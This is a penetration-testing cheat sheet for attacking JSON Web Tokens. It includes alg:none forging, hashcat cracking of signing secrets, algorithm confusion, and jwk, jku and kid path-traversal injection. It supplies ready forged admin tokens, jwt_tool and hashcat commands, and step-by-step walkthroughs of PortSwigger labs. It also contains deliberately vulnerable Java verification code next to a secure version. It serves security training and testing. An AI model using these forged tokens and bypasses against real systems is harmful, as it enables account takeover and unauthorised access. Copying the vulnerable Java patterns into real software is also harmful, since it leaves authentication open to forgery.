tactic: Initial Access 

**JWT** is a compact, URL-safe token format used to send cryptographically signed JSON data between parties. Most commonly used for authentication, session handling, and access control. The server signs the token  if the app doesn't properly verify that signature, an attacker can forge any claims they want.

```
header.payload.signature

eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9   ← base64url encoded header
.eyJzdWIiOiJ3aWVuZXIiLCJyb2xlIjoidXNlciJ9  ← base64url encoded payload (claims)
.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw  ← signature
```

**JWT header** parameters - Injection Points :

|Parameter|What it does|
|---|---|
|`alg`|Signing algorithm (`RS256`, `HS256`, `none`)|
|`jwk`|Embeds a JSON Web Key directly in the header|
|`jku`|URL pointing to a JWK Set — server fetches the key from here|
|`kid`|Key ID — identifies which key to use for verification|

## Checklist

### Recon

- [ ]  Decode the JWT and inspect all header params and claims:

```bash
	# Burp Suite → JSON Web Token tab in Repeater
	# Or manually:
	echo "PAYLOAD_PART" | base64 -d
```

- [ ]  Run jwt_tool in all-attack mode:


```bash
	python3 jwt_tool.py -M at \
	    -t "https://api.example.com/api/v1/user/123" \
	    -rh "Authorization: Bearer eyJhbG...<JWT>"
```

- [ ]  Dump and query a specific JWT from proxy history:


```bash
	python3 jwt_tool.py -Q "jwttool_706649b802c9f5e41052062a3787b291"
```

### alg:none Bypass

- [ ]  Change `alg` to `none`, modify claims, remove the signature (keep trailing dot):

```json
	{"typ":"JWT","alg":"none"}
```

```
	eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.
```

- [ ]  Try variations: `None`, `NONE`, `nOnE`

### Weak Secret — Brute Force

- [ ]  Crack the signing secret with hashcat:


```bash
	hashcat -a 0 -m 16500 <full_jwt> /usr/share/wordlists/rockyou.txt
	hashcat -a 0 -m 16500 <full_jwt> <wordlist> --show   # show result after crack
```

- [ ]  Once cracked — forge any claims and re-sign with the secret

### RS256 → HS256 Algorithm Confusion

- [ ]  Grab the server's RSA public key (from `/jwks.json`, `/.well-known`, or cert)
- [ ]  Change `alg` from `RS256` to `HS256`
- [ ]  Re-sign the token using the **public key as the HMAC secret** — server verifies with same public key it uses to sign RSA, now used as HMAC secret

### JWK Header Injection

- [ ]  Generate a new RSA key pair in Burp JWT Editor
- [ ]  Embed your public key in the JWT header as `jwk`:

```json
	{
	  "alg": "RS256",
	  "jwk": {
	    "kty": "RSA",
	    "e": "AQAB",
	    "n": "YOUR_PUBLIC_KEY_N",
	    "kid": "your-key-id"
	  }
	}
```

- [ ]  Sign with your private key → server uses the embedded (attacker-controlled) public key to verify

**Burp steps:**

1. JWT Editor Keys → New RSA Key → Generate
2. In Repeater → JSON Web Token tab → Attack → Embedded JWK → select your key

### JKU Header Injection

- [ ]  Generate RSA key in Burp, copy public key as JWK
- [ ]  Host a JWK Set on your exploit server:


```json
	{
	    "keys": [
	        {
	            "kty": "RSA",
	            "e": "AQAB",
	            "kid": "893d8f0b-061f-42c2-a4aa-5056e12b8ae7",
	            "n": "yy1wpYmffgXBxhAUJzHH..."
	        }
	    ]
	}
```

- [ ]  In the JWT header, set `jku` to your exploit server URL and match the `kid`
- [ ]  Change `sub` to target user, sign with your private key

**Burp steps:**

1. JWT Editor Keys → New RSA Key → Generate → right-click → Copy Public Key as JWK
2. Paste into exploit server body inside `{"keys": [...]}`
3. In JWT header: set `kid` to match your key's kid, add `jku` pointing to exploit server
4. Change `sub` → Sign with your key

### KID Path Traversal

- [ ]  The server uses `kid` to look up the key file — inject a path traversal pointing to `/dev/null` (empty file → empty key):


```json
	{"kid": "../../../../../dev/null", "alg": "HS256"}
```

- [ ]  Generate a symmetric key with `k: AA==` (empty/null bytes) in Burp JWT Editor
- [ ]  Sign with that key — server reads `/dev/null`, gets empty bytes, HMAC matches

**Burp steps:**

1. JWT Editor Keys → New Symmetric Key → Generate → replace `k` value with `AA==`
2. In JWT header: set `kid` to `../../../../../dev/null`
3. Change `sub` to administrator → Sign with the empty symmetric key

### Unverified Signature

- [ ]  Simply change payload claims without touching the signature — does the server accept it?

```
	sub: wiener → sub: administrator
```

---

## Attack Payloads

**alg:none forged token:**

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbmlzdHJhdG9yIn0.
```

**hashcat crack then re-sign:**


```bash
# Crack
hashcat -a 0 -m 16500 eyJhbGc... rockyou.txt

# Re-sign with python-jwt or jwt_tool after finding secret
python3 jwt_tool.py <jwt> -T -S hs256 -p "found_secret"
```

---

## White Box Testing

**Vulnerable — signature never verified:**

```java
@GetMapping("/api/user/profile")
public ResponseEntity<?> getProfile(@RequestHeader("Authorization") String auth) {
    String token = auth.replace("Bearer ", "");

    // ← manually decoding without verifying signature
    String[] parts = token.split("\\.");
    String payload = new String(Base64.getUrlDecoder().decode(parts[1]));
    JSONObject claims = new JSONObject(payload);

    String sub = claims.getString("sub"); // ← attacker changes sub freely
    return ResponseEntity.ok(userService.findByUsername(sub));
}
```

**Vulnerable — alg:none accepted:**

```java
// Old/misconfigured JJWT — parses without enforcing algorithm
Claims claims = Jwts.parser()
    .setSigningKey(secret)
    .parseClaimsJws(token) // ← some versions accept alg:none and skip verification
    .getBody();
```

**Vulnerable — trusts client-supplied `jku` URL:**

```java
// Fetches the key from whatever URL is in the JWT header — attacker-controlled
String jku = getHeaderParam(token, "jku");
PublicKey key = fetchKeyFromUrl(jku);          // ← fetches from attacker's server
verifySignature(token, key);                   // ← verifies with attacker's key
```

**Vulnerable — kid used in file path without sanitization:**

```java
String kid = getHeaderParam(token, "kid");
// ← kid is used directly to build file path — path traversal possible
byte[] keyBytes = Files.readAllBytes(Paths.get("/keys/" + kid));
SecretKey key = new SecretKeySpec(keyBytes, "HmacSHA256");
```

**Secure:**

```java
// Spring Security — validate JWT properly using issuer's public key
@Bean
public JwtDecoder jwtDecoder() {
    // fetches JWKS from issuer, verifies sig, exp, iss, aud automatically
    return JwtDecoders.fromIssuerLocation("https://auth.example.com");
}

// If using JJWT — always specify allowed algorithms explicitly
Jwts.parserBuilder()
    .requireIssuer("https://auth.example.com")
    .setAllowedClockSkewSeconds(30)
    .setSigningKeyResolver(new JwksKeyResolver()) // ← fetches from trusted JWKS only
    .deserializeJsonWith(...)
    .build()
    .parseClaimsJws(token);

// Whitelist allowed algorithms — never accept none or unexpected algs
JwtParser parser = Jwts.parserBuilder()
    .setSigningKey(publicKey)
    .build(); // JJWT 0.11+ rejects alg:none by default

// Sanitize kid — never use in file path directly
if (!kid.matches("^[a-zA-Z0-9\\-_]+$")) {
    throw new SecurityException("Invalid kid");
}
```

---

# LAB

**JWT authentication bypass via unverified signature**

 Simply change "sub" to administrator

 **JWT authentication bypass via flawed signature verification**


 None algorithm (set "alg": "none" and delete signature part)

**JWT authentication bypass via weak signing key**


>Weak key is easily detected by Burp Suite Passive Scanner

 Crack signing key with hashcat: `hashcat -m 16500 -a 0 <full_jwt> /usr/share/wordlists/rockyou.txt`

 **JWT authentication bypass via jwk header injection**



 4.1 Go to JWT Editor Keys - New RSA Key - Generate  
 4.2 Get Request with JWT token - Repeater - JSON Web Token tab - Attack (at the bottom) - Embedded JWK - Select your previously generated key - OK

 **JWT authentication bypass via jku header injection**



 5.1   JWT Editor Keys - New RSA Key - Generate - right-click on key - Copy Public Key as JWK  
 5.2 Go to your exploit server and paste the next payload in Body:

```json
{
    "keys": [

    ]
}
```

 5.3 In "keys" section paste your previously copied JWK:

```json
{
    "keys": [
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "893d8f0b-061f-42c2-a4aa-5056e12b8ae7",
            "n": "yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw"
        }
    ]
}
```

5.4 Back to our JWT, replace the current value of the kid parameter with the kid of the JWK that you uploaded to the exploit server.  
 5.5 Add a new jku parameter to the header of the JWT. Set its value to the URL of your JWK Set on the exploit server.  
5.6 Change "sub" to administrator  
 5.7 Click "Sign" at the bottom of JSON Web Token tab in repeater and select your previously generated key

**JWT authentication bypass via kid header path traversal**

 6.1 JWT Editor Keys - New Symmetric Key - Generate - replace the value of "k" parameter to AA== - OK  
 6.2 Back to our JWT, replace "kid" parameter with ../../../../../dev/null  
 6.3 Change "sub" to administrator  
 6.4 Click "Sign" at the bottom of JSON Web Token tab in repeater and select your previously generated key
 
## Resources

- [PortSwigger JWT Attacks](https://portswigger.net/web-security/jwt)
- [jwt_tool GitHub](https://github.com/ticarpi/jwt_tool)
- [HackTricks JWT](https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens)
- [jwt.io Debugger](https://jwt.io)**